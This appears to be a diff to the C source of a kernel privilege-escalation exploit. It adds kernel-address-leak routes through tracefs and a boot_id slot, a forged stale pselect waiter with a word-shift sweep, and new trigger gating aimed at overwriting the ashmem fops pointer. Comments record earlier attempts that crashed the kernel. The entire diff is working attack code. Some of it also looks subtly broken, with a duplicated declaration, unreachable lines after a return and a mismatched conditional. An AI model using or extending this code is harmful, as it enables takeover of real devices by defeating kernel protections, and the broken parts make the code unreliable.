@@ -25,6 +25,10 @@
 #define SLIDE_REQUEUE_MAX_POLLS 1000
 #define SLIDE_REQUEUE_POLL_USEC 1000
 
+/* Runtime pselect word-shift override: -1 uses the compiled
+ * SLIDE_PSELECT_WORD_SHIFT; >= 0 uses the override (set per fresh attempt
+ * by the APP_PSELECT_SHIFT_SWEEP diagnostic). */
+static int slide_pselect_runtime_shift = -1;
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
 #define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
 
@@ -190,6 +194,15 @@ static int slide_route_syscall_pad;
 static uint64_t slide_route_fine_delay_ticks;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 int slide_p0_session_fresh;
+#endif
+#if defined(APP_SLIDE_NOPHYS_ROUTE) && APP_SLIDE_NOPHYS_ROUTE
+/* Non-physical slide machinery (v18 boot_id route / v19 tracefs route):
+ * slide_bootid_route is non-zero while a boot_id-route dance is running
+ * (switches the pselect fd-set words to the nfulnl_logger / boot_id-slot
+ * geometry); slide_bootid_slide_done records a successful in-process
+ * non-physical slide for the fresh-P0-session gate in main.c. */
+int slide_bootid_route;
+int slide_bootid_slide_done;
 #endif
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
 int p0_virtual_base_probe;
@@ -823,7 +836,10 @@ int slide_pselect_words_per_set(void) {
 }
 
 int slide_pselect_global_word(int waiter_word) {
-  return SLIDE_PSELECT_WORD_SHIFT + waiter_word;
+  int shift = slide_pselect_runtime_shift >= 0
+                  ? slide_pselect_runtime_shift
+                  : SLIDE_PSELECT_WORD_SHIFT;
+  return shift + waiter_word;
 }
 
 int slide_pselect_put_global_word(
@@ -910,17 +926,33 @@ RMG_RACE_INLINE void prepare_slide_pselect_fdsets(
   uintptr_t stack_pi_left = slide_oracle_target;
   uintptr_t stack_task = fake_task;
   slide_pselect_production_stack = 0;
+#if defined(APP_SLIDE_BOOTID_ROUTE) && APP_SLIDE_BOOTID_ROUTE
+  if (slide_bootid_route) {
+    /* v18 (kp16): the boot_id route replaces the pipe-ring marker with the
+     * random-table boot_id data-ptr slot.  Both the rb_erase tree parent
+     * (the nfulnl_logger object) and the marker target (the slot) are
+     * LINEAR ALIASES of Image .data (P0_DATA_ALIAS_CONST), i.e. ordinary
+     * mapped+writable data addresses - no struct pages, so the vmemmap hole
+     * that kills the physical probe cannot fault here. */
+    stack_tree_parent = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset;
+    stack_tree_left = SLIDE_WAITER_TREE_LEFT + slide_p0_offset;
+    stack_pi_parent = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset;
+    stack_pi_left = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
+  }
+#endif
 #if defined(APP_PRODUCTION_STACK_PI_RIGHT_ONLY) && \
     APP_PRODUCTION_STACK_PI_RIGHT_ONLY
+  /* q6q v20 (kp18): the FOPS production target is the CANONICAL ashmem_misc
+   * fops slot; the linear alias (data_addr) is unmapped on q6q. */
   if (slide_oracle_parent == fake_fops &&
-      slide_oracle_target == data_addr(ASHMEM_MISC_FOPS)) {
+      slide_oracle_target == text_addr(ASHMEM_MISC_FOPS)) {
     /*
      * The stale pselect waiter is dequeued from the lock waiter tree before
      * the PI-tree requeue.  Keep its proven oracle tree and fake-task fields;
      * build 58 cleared the tree child and consequently produced no write.
      * Isolate only the established FOPS PI-child direction here.
      */
-    stack_pi_right = data_addr(ASHMEM_MISC_FOPS);
+    stack_pi_right = text_addr(ASHMEM_MISC_FOPS);
     stack_pi_left = 0;
     slide_pselect_production_stack = 1;
   }
@@ -1172,6 +1204,12 @@ RMG_RACE_INLINE void slide_pselect_stack_copy(void) {
     }
   }
 
+  /* Consumer-side window probe: the forged stale-waiter overlap engaged
+   * only when the pselect returned with at least one ready fd (ret > 0)
+   * after the sched trigger succeeded.  This is the per-attempt signal
+   * the v17 write_window gate arms on. */
+  int write_window = ret > 0 && atomic_load(&slide_consume_sched_ok) > 0;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
   (void)saved_errno;
   (void)pselect_elapsed_usec;
@@ -1180,6 +1218,7 @@ RMG_RACE_INLINE void slide_pselect_stack_copy(void) {
           "ret=%d errno=%d "
           "elapsed_usec=%zu "
           "ready=%d seen=%d entered=%d calls=%d sched_ok=%d "
+          "write_window=%d "
           "last_sched_ret=%d last_sched_errno=%d\n",
           slide_route_nfds, slide_route_syscall_pad,
           slide_pselect_production_stack, ret, saved_errno,
@@ -1189,12 +1228,14 @@ RMG_RACE_INLINE void slide_pselect_stack_copy(void) {
           atomic_load(&slide_consume_enter_sched),
           atomic_load(&slide_consume_calls),
           atomic_load(&slide_consume_sched_ok),
+          write_window,
           atomic_load(&slide_consume_last_sched_ret),
           atomic_load(&slide_consume_last_sched_errno));
 #else
   pr_info("slide pselect returned nfds=%d pad=%d ret=%d errno=%d "
           "elapsed_usec=%zu "
           "ready=%d seen=%d entered=%d calls=%d sched_ok=%d "
+          "write_window=%d "
           "last_sched_ret=%d last_sched_errno=%d\n",
           slide_route_nfds, slide_route_syscall_pad, ret, saved_errno,
           pselect_elapsed_usec,
@@ -1203,9 +1244,11 @@ RMG_RACE_INLINE void slide_pselect_stack_copy(void) {
           atomic_load(&slide_consume_enter_sched),
           atomic_load(&slide_consume_calls),
           atomic_load(&slide_consume_sched_ok),
+          write_window,
           atomic_load(&slide_consume_last_sched_ret),
           atomic_load(&slide_consume_last_sched_errno));
 #endif
+  atomic_store(&slide_pselect_write_window, write_window);
   atomic_store(&slide_stack_write_window,
                ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);
 
@@ -2114,7 +2157,7 @@ static int slide_child_trigger_write(void) {
   pr_info("slide pi stage=cmp-return ret=%ld errno=%d polls=%d\n",
           requeue_ret, requeue_errno, requeue_polls);
   if (requeue_ret != -1 || requeue_errno != EDEADLK) {
-    return 0;
+    return 1;
   }
   pr_info("slide pi stage=deadlock-accepted\n");
   atomic_store(&slide_deadlock_seen, 1);
@@ -2154,12 +2197,47 @@ static int slide_child_trigger_write(void) {
   return result;
 #elif defined(APP_ACCEPT_SCHED_TRIGGER) && APP_ACCEPT_SCHED_TRIGGER
   int sched_ok = atomic_load(&slide_consume_sched_ok) != 0;
+  int write_window = atomic_load(&slide_pselect_write_window) != 0;
+  int waiter_ok = atomic_load(&slide_waiter_ok) != 0;
+#if defined(APP_REQUIRE_WRITE_WINDOW) && APP_REQUIRE_WRITE_WINDOW
+  /* q6q v17 (kp15 mitigation): the consumer-side pselect window is the
+   * only app-level confirmation that the forged stale-waiter geometry
+   * engaged (the pselect returned with ready fds, ret > 0).  On the v16
+   * placement-miss attempts the window never opened (write_window=0) and
+   * the run armed the trigger anyway via sched_ok; attempt 8 then crashed
+   * the chain against a lock whose fabricated bank was not placed
+   * (kp15).  Require the window: a window-less trigger is reported as a
+   * miss (exit code 2) so the caller starts a fresh reclaim instead of
+   * accepting the unconfirmed trigger state.
+   *
+   * v18 refinement: the window signal is a slide-stage phenomenon (the
+   * rb_erase marker landing in the oracle pipe ring, whose parent is a
+   * vmemmap struct page).  The FOPS production trigger's parent is
+   * fake_fops in the payload bank (a direct-map address) and its target
+   * is the Image .data fops slot - the e2s-proven sched_ok acceptance
+   * applies there, so the gate is scoped to vmemmap-parent triggers. */
+  int window_gated = slide_oracle_parent >= VMEMMAP_START;
+  pr_info("slide downstream verification armed sched_ok=%d write_window=%d "
+          "waiter_ok=%d window_gated=%d\n",
+          sched_ok, write_window, waiter_ok, window_gated);
+  if (!waiter_ok) {
+    return 3;
+  }
+  if (!window_gated) {
+    return sched_ok ? 0 : 1;
+  }
+  return write_window ? 0 : 2;
+#else
   int write_window = atomic_load(&slide_stack_write_window) != 0;
   pr_info("slide downstream verification armed sched_ok=%d write_window=%d\n",
           sched_ok, write_window);
-  return atomic_load(&slide_waiter_ok) != 0 && sched_ok;
+  return waiter_ok && sched_ok ? 0 : 1;
+#endif
 #else
   return atomic_load(&slide_waiter_ok) != 0 &&
+                 atomic_load(&slide_pselect_write_window) != 0
+             ? 0
+             : 1;
          atomic_load(&slide_stack_write_window) != 0;
 #endif
 }
@@ -2173,10 +2251,14 @@ static int slide_trigger_physical_state_report(int report_status) {
     }
     disable_rseq_for_thread();
     slide_log_child_context();
-    _exit(slide_child_trigger_write() ? 0 : 1);
+    _exit(slide_child_trigger_write());
   }
   int status = 0;
   SYSCHK(waitpid(child, &status, 0));
+  int exit_code = WIFEXITED(status) ? WEXITSTATUS(status) : -1;
+  int ok = exit_code == 0;
+  pr_info("p0 physical write status=%d exit=%d ok=%d\n",
+          status, exit_code, ok);
   int ok = WIFEXITED(status) && WEXITSTATUS(status) == 0;
   if (report_status) {
     pr_info("p0 physical write status=%d ok=%d\n", status, ok);
@@ -2463,6 +2545,40 @@ static int slide_leak_physical_base(void) {
 #endif
       continue;
     }
+#if defined(APP_PSELECT_SHIFT_SWEEP) && APP_PSELECT_SHIFT_SWEEP
+    /* kp10 (shift 3) read NULL and kp11 (shift 2) read raw fd bits at the
+     * kernel's waiter->lock position; both imply the kernel's stale waiter
+     * sits at word offset S=6 on those attempts (the hits used S=3), so the
+     * sweep tries the S=6 hypothesis first. */
+    static const int pselect_shift_sweep[] = {3, 6, 5, 4, 1, 0, 7, 2};
+#if defined(APP_KSTACK_OFFSET_DIAG) && APP_KSTACK_OFFSET_DIAG
+    /* q6q: CONFIG_RANDOMIZE_KSTACK_OFFSET=y shifts the kernel stack per
+     * syscall entry by round_up_16(kstack_offset & 0x3ff).  The per-CPU
+     * slot for CORE (cpu 0) sits at the slid image offset 0xa208080 and is
+     * linearly readable via the configfs primitive (phys 0x82288080 is in
+     * the mapped zone).  Read and log it for correlation with hits. */
+    {
+      int kstk_fd = open_ashmem_device();
+      if (kstk_fd >= 0) {
+        uint32_t kstk = 0;
+        ssize_t n = configfs_read_once(kstk_fd, KSTACK_OFFSET_SLOT_ALIAS,
+                                       &kstk, sizeof(kstk));
+        pr_info("kstack offset diag read=%zd value=0x%x aligned_shift=0x%x "
+                "qwords=%d\n",
+                n, kstk, (kstk + 0xf) & ~0xfU, ((kstk + 0xf) & ~0xfU) >> 3);
+        close(kstk_fd);
+      } else {
+        pr_info("kstack offset diag open failed errno=%d\n", errno);
+      }
+    }
+#endif
+    slide_pselect_runtime_shift =
+        pselect_shift_sweep[(size_t)(fresh_attempt - 1) %
+                            (sizeof(pselect_shift_sweep) /
+                             sizeof(pselect_shift_sweep[0]))];
+    pr_info("pselect shift sweep fresh=%d/%d shift=%d\n",
+            fresh_attempt, fresh_page_attempts, slide_pselect_runtime_shift);
+#endif
     if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
       pr_error("p0 physical pipe gate trigger failed fresh=%d/%d\n",
                fresh_attempt, fresh_page_attempts);
@@ -2724,6 +2840,11 @@ static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
   uintptr_t parent = direct_to_page(payload_base);
   uintptr_t target = pipebuf_page_base +
                      P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+#if defined(APP_P0_ORACLE_SLOT1_GATE) && APP_P0_ORACLE_SLOT1_GATE
+  /* Match the v16 kp14 fix: keep the diag gate marker off the kmalloc-2k
+   * object-0 freeptr slot at +0x800 (entry 1's .page instead). */
+  target += sizeof(struct user_pipe_buffer);
+#endif
   static const char marker[] = "RMG-P0-ORACLE-GATE";
   uintptr_t marker_address = payload_base + P0_ORACLE_GATE_PAGE_OFF;
   if (getenv("P0_ORACLE_READ_DIAG")) {
@@ -2837,6 +2958,217 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
   return 1;
 }
 
+#if defined(APP_SLIDE_TRACEFS_ROUTE) && APP_SLIDE_TRACEFS_ROUTE
+static int slide_tracefs_write(const char *path, const char *value) {
+  int fd = open(path, O_WRONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  size_t len = strlen(value);
+  ssize_t wrote = write(fd, value, len);
+  close(fd);
+  return wrote == (ssize_t)len;
+}
+
+static int slide_tracefs_parse_page(
+    const unsigned char *page, size_t page_len, uintptr_t *candidate_out) {
+  if (page_len < 20) {
+    return 0;
+  }
+
+  uint64_t commit = 0;
+  memcpy(&commit, page + 8, sizeof(commit));
+  size_t data_len = (size_t)(commit & 0xfffULL);
+  size_t end = 16 + data_len;
+  if (end > page_len) {
+    end = page_len;
+  }
+
+  for (size_t pos = 16; pos + 4 <= end;) {
+    uint32_t event_header = 0;
+    memcpy(&event_header, page + pos, sizeof(event_header));
+    uint32_t type_len = event_header & 0x1fU;
+    if (type_len == 30) {
+      pos += 8;
+      continue;
+    }
+    if (type_len == 31) {
+      pos += 12;
+      continue;
+    }
+    if (type_len == 0 || type_len >= 29) {
+      break;
+    }
+
+    size_t record_len = (size_t)type_len * 4;
+    size_t record = pos + 4;
+    if (record + record_len > end) {
+      break;
+    }
+    uint16_t event_id = 0;
+    memcpy(&event_id, page + record, sizeof(event_id));
+    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
+      uint64_t caller = 0;
+      memcpy(&caller, page + record + 16, sizeof(caller));
+      uint64_t link_caller =
+          KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
+      if (caller >= link_caller) {
+        uint64_t candidate = caller - link_caller;
+        if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
+          pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
+                     (unsigned long long)caller,
+                     (unsigned long long)candidate);
+          *candidate_out = (uintptr_t)candidate;
+          return 1;
+        }
+      }
+    }
+    pos = record + record_len;
+  }
+  return 0;
+}
+
+static int slide_leak_tracefs_route(void) {
+  static const char tracing_on[] = "/sys/kernel/tracing/tracing_on";
+  static const char trace[] = "/sys/kernel/tracing/trace";
+  static const char event_enable[] =
+      "/sys/kernel/tracing/events/sched/sched_blocked_reason/enable";
+
+  if (!slide_tracefs_write(tracing_on, "0") ||
+      !slide_tracefs_write(event_enable, "1") ||
+      !slide_tracefs_write(tracing_on, "1")) {
+    pr_error("slide tracefs setup failed errno=%d\n", errno);
+    return 0;
+  }
+
+  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
+  if (trace_fd >= 0) {
+    close(trace_fd);
+  }
+  sleep(1);
+  slide_tracefs_write(tracing_on, "0");
+
+  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  uintptr_t candidate = 0;
+  int found = 0;
+  for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
+    char path[128];
+    snprintf(path, sizeof(path),
+             "/sys/kernel/tracing/per_cpu/cpu%d/trace_pipe_raw", cpu);
+    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+    if (fd < 0) {
+      continue;
+    }
+    unsigned char page[4096];
+    ssize_t got;
+    while ((got = read(fd, page, sizeof(page))) > 0) {
+      if (slide_tracefs_parse_page(page, (size_t)got, &candidate)) {
+        found = 1;
+        break;
+      }
+    }
+    close(fd);
+  }
+  slide_tracefs_write(event_enable, "0");
+  if (!found) {
+    pr_error("slide tracefs worker caller not found\n");
+    return 0;
+  }
+
+  if (slide_commit_stext(KIMAGE_TEXT_BASE + candidate, "tracefs")) {
+    /* In-process non-physical slide: satisfies the fresh-P0-session gate
+     * the same way a boot_id slide does (the FOPS stage builds its own
+     * fresh P0 state). */
+    slide_bootid_slide_done = 1;
+    return 1;
+  }
+  return 0;
+}
+#endif
+
+#if defined(APP_SLIDE_BOOTID_ROUTE) && APP_SLIDE_BOOTID_ROUTE
+static int slide_leak_bootid_route(void) {
+  static const uintptr_t bootid_candidates[] = {
+    SLIDE_P0_OFFSET_CANDIDATES
+  };
+
+  /* The random-table slot may already hold the logger object from an
+   * earlier attempt of this process: try the direct read first. */
+  uint64_t stext = slide_read_stext();
+  if (stext && slide_commit_stext(stext, "boot_id")) {
+    slide_bootid_slide_done = 1;
+    return 1;
+  }
+
+  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+  if (!page_base || !fake_lock) {
+    pr_error("slide boot_id route reclaim failed base=%016zx\n", page_base);
+    return 0;
+  }
+
+  slide_bootid_route = 1;
+  size_t candidate_count =
+      sizeof(bootid_candidates) / sizeof(bootid_candidates[0]);
+  for (size_t attempt = 0; attempt < candidate_count; attempt++) {
+    slide_p0_offset = bootid_candidates[attempt];
+    pr_info("slide boot_id attempt=%zu/%zu p0_offset=%08zx "
+            "logger_alias=%016llx bootid_slot_alias=%016llx\n",
+            attempt + 1, candidate_count, slide_p0_offset,
+            (unsigned long long)(SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset),
+            (unsigned long long)(SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR +
+                                 slide_p0_offset));
+
+    int raw_fds[2];
+    SYSCHK(pipe(raw_fds));
+    int fds[2];
+    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, PSELECT_ROUTE_NFDS + 128));
+    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, PSELECT_ROUTE_NFDS + 129));
+    SYSCHK(close(raw_fds[0]));
+    SYSCHK(close(raw_fds[1]));
+
+    pid_t child = SYSCHK(fork());
+    if (child == 0) {
+      SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+      if (getppid() == 1) {
+        _exit(1);
+      }
+      SYSCHK(close(fds[0]));
+      disable_rseq_for_thread();
+      slide_log_child_context();
+      uint64_t child_stext = slide_child_leak_stext();
+      if (child_stext) {
+        SYSCHK(write(fds[1], &child_stext, sizeof(child_stext)));
+        _exit(0);
+      }
+      _exit(1);
+    }
+
+    SYSCHK(close(fds[1]));
+    uint64_t child_stext = 0;
+    ssize_t n = read(fds[0], &child_stext, sizeof(child_stext));
+    SYSCHK(close(fds[0]));
+    int status = 0;
+    SYSCHK(waitpid(child, &status, 0));
+    if (n != (ssize_t)sizeof(child_stext) || !WIFEXITED(status) ||
+        WEXITSTATUS(status) != 0 || !child_stext) {
+      pr_warning("slide boot_id attempt %zu failed n=%zd status=%d\n",
+                 attempt + 1, n, status);
+      continue;
+    }
+
+    /* The commit validates the leak itself (canonical 0xffff.. pointer,
+     * slide <= 0x1f0000, 64 KiB aligned) and requires it to equal the
+     * danced candidate - a misplaced marker can never pass. */
+    if (slide_commit_stext(child_stext, "pselect")) {
+      slide_bootid_slide_done = 1;
+      slide_bootid_route = 0;
+      return 1;
+    }
+  }
+  slide_bootid_route = 0;
+  return 0;
+}
+#endif
 
 
 int slide_leak_kernel_base(void) {
@@ -2889,6 +3221,24 @@ int slide_leak_kernel_base(void) {
     return slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
 #endif
   }
+#if defined(APP_SLIDE_TRACEFS_ROUTE) && APP_SLIDE_TRACEFS_ROUTE
+  /* v19 (kp17): the passive tracefs leak runs first - no chain, no writes,
+   * no crash risk.  Only if it fails do the riskier routes run. */
+  if (slide_leak_tracefs_route()) {
+    return 1;
+  }
+  pr_warning("slide tracefs route failed; falling back to boot_id route\n");
+#endif
+#if defined(APP_SLIDE_BOOTID_ROUTE) && APP_SLIDE_BOOTID_ROUTE
+  /* v18 (kp16): the physical fingerprint probe is impossible on q6q (the
+   * Image sits in an unmapped vmemmap section).  Take the slide from the
+   * boot_id / nfulnl_logger leak first; the physical probe remains only as
+   * a fallback. */
+  if (slide_leak_bootid_route()) {
+    return 1;
+  }
+  pr_warning("slide boot_id route failed; falling back to physical probe\n");
+#endif
   const char *slide_source = getenv("SLIDE_SOURCE");
   int force_p0 = slide_source && strcmp(slide_source, "p0") == 0;
 #if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
